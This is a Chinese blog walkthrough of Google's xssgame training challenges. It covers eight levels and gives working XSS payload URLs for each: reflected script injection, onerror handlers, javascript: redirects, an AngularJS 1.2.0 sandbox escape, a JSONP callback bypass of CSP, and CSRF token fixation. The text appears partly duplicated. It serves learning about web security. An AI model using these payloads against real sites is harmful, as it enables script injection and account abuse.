atob(m[1]) : 'about'; // 如果没有获取到参数，则赋值为 'about'\n    document.write('<script src=\"jsonp?menu=' + encodeURIComponent(menu) + '\"></script>'); // 在页面中写入 <script> 标签 ，通过 src 请求资源\n}\n```\n\n因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。\n\n想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：'about'、'cats'、'dogs'。相应的会有三种 callback 的 JSON 对象。\n\n如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。\n\n我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，'atob' 函数是解码，编码函数猜也猜到应该是 'btoa' 了~\n在 chrome 浏览器的控制台下输入：\n\n![Level_7_Btoa_Function](/Image/Level_7_Btoa_Function.png)\n\n得到转码后的值，在输入到浏览器中：\n\n![Level_7_Ev1l_Response](/Image/Level_7_Ev1l_Response.png)\n\n我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。\n\n后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」\n\n尝试通关：\n\n我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下：\n\n```\n先在控制台 btoa(\"<img src='' onerror='alert()' />\") 得到 \"PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=\"\n再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=\n```\n![Level_7_Img_Pass_Fail](/Image/Level_7_Img_Pass_Fail.png)\n\nchrome 控制台红字提示：\n```\n   Refused to execute inline event handler because it violates the following Content Security Policy directive: \"default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/\". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.\n```\n因为 CSP 的关系，失败了。\n\n没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。\n\n先给个小提示：\n\n![Level_7_Pass_idea](/Image/Level_7_Pass_idea.png)\n\n自己先想两分钟~\n\n```\n给 menu 传入经过 base64 编码后的：\n    <script src='jsonp?callback=alert()%3B//'></script> // 转义前为：<script src='jsonp?callback=alert();//'></script>\n会把\n    <script src='jsonp?callback=alert();//'></script>\n显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为：\n    alert();//({...})\nalert(); 后面被注释掉，执行 alert();\n\n```\n最后我们组织的 URL 为：\n```\nhttp://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+\n```\n过关：\n\n![Level_7_Pass](/Image/Level_7_Pass.png)\n\n## Level 8  \n\n[最后一关的贴心传送门 QAQ](http://www.xssgame.com/d9u16LTxchEi)\n\n![Level_8_Welcome](/Image/Level_8_Welcome.png)\n\n>This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.\n\n好，我们继续无视提示信息，来看一下这一关。\n\n尊敬下上一关，我们先看一下 Level8.js 的内容：\n\n![Level_8_Level8js](/Image/Level_8_Level8js.png)\n\n这个文件负责读取 cookie 的信息，如果读取到了 'name' 的内容，就 document.write 到页面上。\n通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&*，他一显示到页面上不就……\n\n行了，别意淫了：\n\n![Level_8_CSP](/Image/Level_8_CSP.png)\n\n我们来看看有没有其他可以利用的地方呢。先试试功能吧。\n\n我们随便设置一下名字：\n\n![Level_8_Set_Name](/Image/Level_8_Set_Name.png)\n\n点击 Set 看看发生了什么:\n\n![Level_8_Set_End](/Image/Level_8_Set_End.png)\n\n页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：\n```\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=name&value=Geekaleo&redirect=index\n其中：\nset?name=name&value=Geekaleo&redirect=index\nname=name value=Geekaleo 不禁让人菊花一紧\n那我：\nname=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……\n\nredirect=index 显然这个参数是用来跳转的\n```\nset csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水：\n\n![Level_8_Send](/Image/Level_8_Send.png)\n\n我们接到了一个警告福利：\n\n![Level_8_Send_Fail](/Image/Level_8_Send_Fail.png)\n\n这里我们得到了几个有用的信息：\n\n>1.我们输入的不合法金额也就是 'amount' 参数的值被返回到了前台打印了出来。  \n2.此页面没有 CSP 的标识。  \n3.csrf_token 作为参数传递给后台。  \n\n根据前两点呢，我们测试一下 把 'amount' 的内容改成一段能够触发 alert() 的脚本：\n\n![Level_8_Pass_Fail](/Image/Level_8_Pass_Fail.png)\n\n成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的：\n\n![Level_8_Token_Not_Same](/Image/Level_8_Token_Not_Same.png)\n\n这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。\n\n我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。\n\nOK，我们来构建URL：\n\n```\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer?name=hello+kitty&amount=<script>alert()</script>&csrf_token=Pass\n\n这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 & 符会被截断。\n\n所以我们这里 把这个 'redirect=' 后面的内容处理一下，chrome 控制台：\nencodeURIComponent('transfer?name=hello+kitty&amount=%3Cscript%3Ealert()%3C/script%3E&csrf_token=Pass')\n得到返回值：\ntransfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass\n\n好我们替换一下 URL：\nhttp://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass\n```\n:) 过关：\n\n![Level_8_Pass](/Image/Level_8_Pass.png)\n\n\n愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间……\n\n![All_Level_Pass](/Image/All_Level_Pass.png)\n\n「别等了，没彩蛋…… QAQ」\n","source":"_posts/Google_xssgame.md","raw":"---\ntitle: 「从入门到入狱系列」 - xssgame 通关经验(草稿) \ndate: 2017-08-03\nlayout: post\ncomments: true\nreward: true\ntags:\n    - XSS\n    - game\n    - 从入门到入狱\n---\n\n此链接只能墙外围观享用\n\n主站：[www.xssgame.com](http://www.xssgame.com) \n\n![StartPlay](/Image/Start_Playing.png)  \n\n<!-- more -->\n***\n刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。\n这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了……\n\n下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。\n## LEVEL 1\n[贴心的传送门](http://www.xssgame.com/m4KKGHi2rVUN)\n\n![StartPlay](/Image/Level_1_Welcome.png)\n上面的英文大致是个玩法的介绍和一些关于本关的信息：  \n>此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。  \n与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。  \n输入一个将使应用程序在JavaScript中执行alert()函数的输入。  \n一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。  \n--来自原汁原味的 translate.google.com （自己感受下）\n\n「说人话！」\n\n通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。\n\n至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：）\n\n「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」\n\n你别说，还真能：\n\n![ad](/Image/ad.png)\n\n//我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了\n\n我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。\n\n![LEVEL_1_TREE_DETAIL](/Image/Level_1_Tree_Detail.png)\n\n其中 *index* 是主页文件，*foogle.png* 是大 Foogle Logo，唯独 *js_frame.js* 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。\n\n*index* 中是一个简单的 form 表单的提交。我们随便搜点什么后：  \n1.URL 变化  \n2.页面重新加载  \n3.刚刚搜索的内容被一起加载到也页面中。  \n\n其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。\n回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：\n```\n<script>alert()</script>\n```\n拼出如下URL：\n\n```\nhttp://www.xssgame.com/f/m4KKGHi2rVUN/?query=<script>alert()</script>\n```\n\n**使其在页面加载时就载入含有 alert 效果的 javascript 代码块。**\n\n过关：\n![LEVEL_1_PASS](/Image/LEVEL_1_Pass.png)\n\n## LEVEL 2\n[贴心的传送门](http://www.xssgame.com/WrfpuKFX8GNr)\n\n![StartPlay2](/Image/Level_2_Welcome.png)\n***\n来看一下页面上的信息：\n>用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。  \n输入一个将使应用程序在JavaScript中执行alert()函数的输入。  \n--来自原汁原味的 translate.google.com （哎，不背锅，哎）\n\n大意是在提醒我们，要注意每一个比特。  \n举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 \n\n// 不生硬，一点都不生硬的过度\n\n初次加载的文件中规中矩，一个*index*里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。\n\n我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧：  \n![CreateTimer](/Image/Level_2_Create_Timer.png)\n\n来看一下新跳转的页面有哪些需要注意的东西：  \n![CreateTimer](/Image/Level_2_Timer_Js.png)\n\n我们观察发现：\n```html\n<img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" />\n```\n和\n```html\n<div id=\"message\">Your timer will execute in 3 seconds.</div>\n```\n两处回显了我们的数据。而前半部 javascript 代码也有一个3：\n```js\nfunction startTimer(seconds) {\n    seconds = parseInt(seconds) || 3;\n    setTimeout(function() {\n        window.confirm(\"Time is up!\");\n        window.loading.style.display = 'none';\n        window.message.innerHTML = '<a href=\"?\">Go back</a> to the timer setup page';\n    }, seconds * 1000);\n}\n```\n提交其他参数后发现，跟我们提交的参数无关，无视之。  \n那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：\n```html\n<img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" />\n```\n这里可以搞：\n```js\nonload = \"startTimer('3');\"\n```\n怎么搞呢，你需要知道一个知识点：\n```js\n<script>\n    var a = 'a' + alert(); // 或者 '-' 也可以，重点在于让 alert() 参与运算\n\n    // 当 alert() 参与运算的时候\n    // js 会尝试让 alert() 先执行\n    // 然后取其执行后的返回值再参与前面的运算\n    // 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』\n</script>\n```\n我们再结合 img 标签的 onload 事件：\n```js\nonload = \"startTime('?')\"; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方\n/*\n    别往下瞅了，下面就是答案了，自己不寻思寻思啊\n    强行占一行\n    再来一行\n    嗯，上下注释符号还能占两行，差不多了。\n*/\n// 先尝试直接插入alert()\nonload = \"startTimer('alert()')\"; // startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行\n// 看看上面的知识点……\n// 插入 a'+alert()+'a\nonload = \"startTimer('a'+alert()+'a')\"; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串\n// 插入 '+alert()+'\nonload = \"startTimer(''+alert()+'')\";\n\n```\n嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~\n```\nhttp://www.xssgame.com/f/WrfpuKFX8GNr/?timer='+alert()+'\n```\n提交一下……\n「我曹不对吧」\n「这也没过关啊，日，讲啥呢一天天。」\n「你哔哔这么长时间，念经呢这是？」\n别着急，'+' 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。\n我们这边转义一下这个'+'字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：\n![Level_2_URL_Encode](/Image/Level_2_URL_Encode.png)  \n我们用%2B（或%2b）替换一下原来的加号。\n```\nhttp://www.xssgame.com/f/WrfpuKFX8GNr/?timer='%2Balert()%2B'\n```\n过关：\n![Level_2_Pass](/Image/Level_2_Pass.png)  \n上图中的 URL 虽然我们提交的是'%2B',浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改'+'为'%2B'再提交一次，你就会发现你提交的是'+',我们也并没有再次过关 :)  \n另外，直接用'-'号其实没这么麻烦，不用转义，直接写就行 :)  \n「……」  \n![pugai](/Image/pugaizai.jpeg)  \n**上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~）**\n\n## LEVEL 3\n[贴心传送门](http://www.xssgame.com/u0hrDTsXmyVJ)  \n\n![Level_3_Welcome](/Image/Level_3_Welcome.png)  \n***\n见证机翻的时刻：\n>复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。  \n该级别的应用程序正在使用一个这样的接收器。  \n由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。  \n--来自看完觉得没什么卵用的 translate.google.com  \n\n其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。  \n后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) \n\n// 过渡~\n看得出来，这是一位吸猫癌患者:\n```html\n    <div class=\"tab\" id=\"tab1\" onclick=\"chooseTab('1')\">Cat 1</div>\n    \n    <div class=\"tab\" id=\"tab2\" onclick=\"chooseTab('2')\">Cat 2</div>\n    \n    <div class=\"tab\" id=\"tab3\" onclick=\"chooseTab('3')\">Cat 3</div>\n```\n*index* 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧：  \n\n![bbox](/Image/shut_up_and_bbox.jpg)  \n\n奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：\n```js\nfunction chooseTab(name) {\n    var html = \"Cat \" + parseInt(name) + \"<br>\";\n    html += \"<img src='/static/img/cat\" + name + \".jpg' />\";\n    document.getElementById('tabContent').innerHTML = html;\n\n    // Select the current tab\n    var tabs = document.querySelectorAll('.tab');\n    for (var i = 0; i < tabs.length; i++) {\n        if (tabs[i].id == \"tab\" + parseInt(name)) {\n            tabs[i].className = \"tab active\";\n        } else {\n            tabs[i].className = \"tab\";\n        }\n    }\n    window.location.hash = name;\n\n    // Tell parent we've changed the tab\n    top.postMessage({'url': self.location.toString()}, \"*\");\n}\n\n```\n这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应'数字.jpg'的图片。\n```\n需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 <script>...</script> 并不会被执行。\n```\n没关系啊，有了上一关的经验，我们可以拼字符串啊。\n佛死特奥富奥，你得知道个知识点：\n```html\n<img src='' onerror='alert()' />\n<!--\n    当图片加载错误的时候，就会执行 onerror 中的 alert() 方法\n    对于本关\n    我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了\n    你问我怎么让它执行？\n    插啊，插进去不就行了吗 →_→\n--> \n```\n我们拼出如下URL：\n```\nhttp://www.xssgame.com/f/u0hrDTsXmyVJ/#1' onerror='alert()'\n```\n**用单引号截断1,使其 scr 指向'1'这个文件，并加入 onerror 事件，而因为'1'这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。**\n\n过关：  \n![Level_3_Pass](/Image/Level_3_Pass.png)\n\n## LEVEL 4\n\n[贴心传送门](http://www.xssgame.com/__58a1wgqGgI)\n\n![Level_4_Welcome](/Image/Level_4_Welcome.png)  \n\n来看一下提示里面的有效信息:\n>跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。\n\n再来看一下页面内容：\n\n![Level_4_Sign_up](/Image/Level_4_Sign_Up.png)\n\n我们先跟着流程走一下，过程中看看有没有什么可利用的地方：\n\nsign up 按钮的代码是这样的：\n```html \n<a href=\"signup?next=confirm\">Sign up</a> \n```\n\n点击以后，我们跳转到这个页面：\n\n![Level_4_Enter_Email](/Image/Level_4_Enter_Email.png)\n\n\n页面中有一段注释：\n```html\n    <!-- We're ignoring the email, but the poor user will never know! -->\n```\n……神经病\n\nnext >> 的代码是这样：\n```html\n<a href=\"confirm?next=welcome\">Next >></a>\n```\n点击 next >> 会跳转到下一个页面\n\n![Level_4_Thanks_For](/Image/Level_4_Thanks_For.png)\n\n页面代码如下：\n\n![Level_4_Thanks_For_Source](/Image/Level_4_Thanks_For_Source.png)\n\n我们注意到有这样一个地方：\n```js\n<script>\n    setTimeout(function() { window.location = 'welcome'; }, 1000);\n</script>\n```\n其中的'Welcome'像是我们 URL 中传入的参数。\n经传入其他参数测试，发现 window.location = 我们传入的参数。\n这样问题就简单了，首先，知识点你得有：\n```js\n    window.location = 'welcome'; \n    /*\n        这是一个页面重定向的操作\n        这里就不展开普及了,可以去 w3school 充充电。\n        window.location 等同于 window.location.href\n        而 DOM 的 href 属性呢，支持这样写：\n        <a href='javascript:alert()' > </a>\n        咳咳，你懂得。\n    */\n```\n所以这边只需要传入：'javascript:alert()' 来替换 'welcome' 就可以了：\n拼出如下 URL:\n```\nhttp://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()\n```\n过关:\n![Level_4_Pass.png](/Image/Level_4_Pass.png)\n\n## LEVEL 5\n\n[贴心传送门](http://www.xssgame.com/JFTG_t7t3N-P)\n\n![Level_5_Welcome](/Image/Level_5_Welcome.png)\n\n有请我们的翻译君：\n>Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。  \n这个挑战是为什么这很重要。  \n目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。  \n\n对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。\n\n「Angular是啥？」\n\n![heiren](/Image/hei1.jpeg)\n\n其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。\n\n我们先常规思路分析一波，先看看页面文件的内容：\n```js\n<script>\n      angular.module('myApp', [])\n      .controller('myController', ['$scope', function ($scope) {\n        $scope.query = \"\";\n        $scope.alert = window.alert;\n      }]);\n\n      var UTM_PARAMS = [\"utm_content\", \"utm_medium\", \"utm_source\",\n          \"utm_campaign\", \"utm_term\"]\n\n      if (location.search)\n      {\n        var params = location.search.substring(1).split('&');\n\n        for (var p in params) {\n          var r = params[p].split('=');\n\n          if (r.length == 2 && UTM_PARAMS.indexOf(r[0]) != -1) {\n            var el = document.getElementsByName(r[0]);\n            if (el.length) el[0].value = decodeURIComponent(r[1]);\n          }\n        }\n      }\n    </script>\n```\n这里就提供了足够的信息够我们过关了。\n这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。\n先定义了一个数组，用来过滤 URL 中的参数。\n过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：\n```html\n    <input id=\"demo2-query\" name=\"query\" maxlength=\"140\" ng-model=\"query\" placeholder=\"Enter query here...\">\n    <input name=\"utm_term\" type=\"hidden\">\n    <input name=\"utm_campaign\" type=\"hidden\" value=\"cpc\">\n    <input id=\"demo2-button\" type=\"submit\" value=\"Search\">\n```\n聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。\n怎么搞呢？\n我们先搜下 Angular 中 alert 怎么写：\n```js\n{{alert()}}\n```\n好知道了这个我们构建 URL，就选择 'utm_term' 这个节点吧：\n```\nhttp://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}}\n```\n过关：\n\n![Level_5_Pass](/Image/Level_5_Pass.png)\n\n(至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~)\n\n## LEVEL 6\n\n[贴心传送门](http://www.xssgame.com/rWKWwJGnAeyi)\n\n![Level_6_Welcome](/Image/Level_6_Welcome.png)\n\n（前面那个关的 boss 死了，儿子又来了？？？）\n\n没什么卵用的翻译（其实还是有用的~）：\n>导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。  \n目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。\n\n这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况：\n\n![Level_6_Search](/Image/Level_6_Search.png)\n\n手动输入 **query** 使用 get 方式搜索：\n\n![Level_6_Query](/Image/Level_6_Query.png)\n\n我们注意到页面均显示出我们之前搜索的字符串。\n\n新的页面中的代码：\n\n```html\n<p ng-non-bindable>Sorry, no results were found for <b>1234</b>.</p>\n```\n\n'ng-non-bindable' 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们搞 form 中的那个。\n\n我们注意到这样一段代码：\n\n```html\n<script src=\"//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"></script>\n```\n\n没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。\n这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。\n\n![Level_6_Google_XSS](/Image/Level_6_Google_XSS.png)\n\n按照惯例，我们先看一下第一个：\n```html\nhttp://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html\n```\n![Level_6_PortSwigger](/Image/Level_6_PortSwigger.png)\n\n有兴趣的可以去看一下，写的头头是道啊~\n\n当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：\n我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses：\n\n```js\n{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n```\n直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是：\n\n![Level_6_Search_Para](/Image/Level_6_Search_Para.png)\n\n我们拼一下 URL：\n```\nhttp://www.xssgame.com/f/rWKWwJGnAeyi/?query={{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()}}\n```\n好，提交，过关：\n\n![heiren](/Image/hei2.jpeg)\n\n![Level_6_Query_String](/Image/Level_6_Query_String.png)\n```\n把'{'、'}'换成'&lcub;'、'&rcub;'试一下(google 来的~我也记不住是啥。)\n也可以只替换'{',因为'}'并没有被过滤，不过我查都查了，替！\n```\n\n新的 URL：\n```\nhttp://www.xssgame.com/f/rWKWwJGnAeyi/?query=&lcub;&lcub;a='constructor';b=&lcub;&rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()&rcub;&rcub;\n```\n冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」：\n\n![Level_6_Pass](/Image/Level_6_Pass.png)\n\n咳咳，过关过关……\n\n## LEVEL 7\n\n[贴心传送门](http://www.xssgame.com/wmOM2q5NJnZS)\n\n![Level_7_Welcome.png](/Image/Level_7_Welcome.png)\n\n翻译君：\n>内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。  \n这个挑战显示了一种常见的CSP旁路技术。  \n目标是再次使用应用程序中的循环来执行JavaScript alert()函数。\n\n其中提到了一个东西 'CSP' 就是'内容安全策略', 这是啥东西呢？\n\n>内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。  \n-- 来自 wiki 百科\n\n这次除了 (index) 文件，我们还有两个地方需要关注下：\n\n![Level_7_Web_DOM](/Image/Level_7_Web_DOM.png)\n\n按照惯例，我们先看一下页面文件 (index)：\n```html\n<a href=\"?menu=YWJvdXQ=\">About Me</a>\n<a href=\"?menu=Y2F0cw==\">Cats</a>\n<a href=\"?menu=ZG9ncw==\">Dogs</a>\n<script src=\"/static/js/level7.js\"></script>\n```\n我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。\n\n我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：\n```js\nfunction main(){\n    //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 <script> 标签，来访问资源。\n    //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码\n}\n\nfunction callback(data){\n    // 通过代码判断，data 应该是 json 格式。\n    // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源\n}\nmain(); //执行 main 方法\n```\n\n这个代码段比较简单，我们看一下 'jsonp?menu=about' 的内容：\n\n![level_7_Web_Jsonp](/Image/Level_7_Web_Jsonp.png)\n\n我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 'jsonp'：\n\n![Level_7_Jsonp_XSS](/Image/Level_7_Jsonp_XSS.png)\n\n呀呵，第一个就是知道创宇的文章: [JSONP 安全攻防技术](http://blog.knownsec.com/2015/03/jsonp_security_technic/)\n\n```\nJSONP：\nJSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。\n```\n这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。\n\n回到正题，文中有这样一段引起了我们的注意：\n\n![Level_7_Jsonp_XSS_Blog](/Image/Level_7_Jsonp_XSS_Blog.png)\n\n我们用 callback 这个参数去我们的 Level 7 中测试一下：\n\n![Level_7_Callback_Test](/Image/Level_7_Callback_Test.png)\n\nok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。\n\nLevel7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：\n```js\nfunction main() {\n    var m = location.search.match('menu=(.*)');// 查找了一下当前 URL 中 'menu=' 后面的参数\n    var menu = m ? atob(m[1]) : 'about'; // 如果没有获取到参数，则赋值为 'about'\n    document.write('<script src=\"jsonp?menu=' + encodeURIComponent(menu) + '\"></script>'); // 在页面中写入 <script> 标签 ，通过 src 请求资源\n}\n```\n\n因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。\n\n想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：'about'、'cats'、'dogs'。相应的会有三种 callback 的 JSON 对象。\n\n如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。\n\n我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，'atob' 函数是解码，编码函数猜也猜到应该是 'btoa' 了~\n在 chrome 浏览器的控制台下输入：\n\n![Level_7_Btoa_Function](/Image/Level_7_Btoa_Function.png)\n\n得到转码后的值，在输入到浏览器中：\n\n![Level_7_Ev1l_Response](/Image/Level_7_Ev1l_Response.png)\n\n我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。\n\n后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」\n\n尝试通关：\n\n我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下：\n\n```\n先在控制台 btoa(\"<img src='' onerror='alert()' />\") 得到 \"PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=\"\n再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=\n```\n![Level_7_Img_Pass_Fail](/Image/Level_7_Img_Pass_Fail.png)\n\nchrome 控制台红字提示：\n```\n   Refused to execute inline event handler because it violates the following Content Security Policy directive: \"default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/\". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce 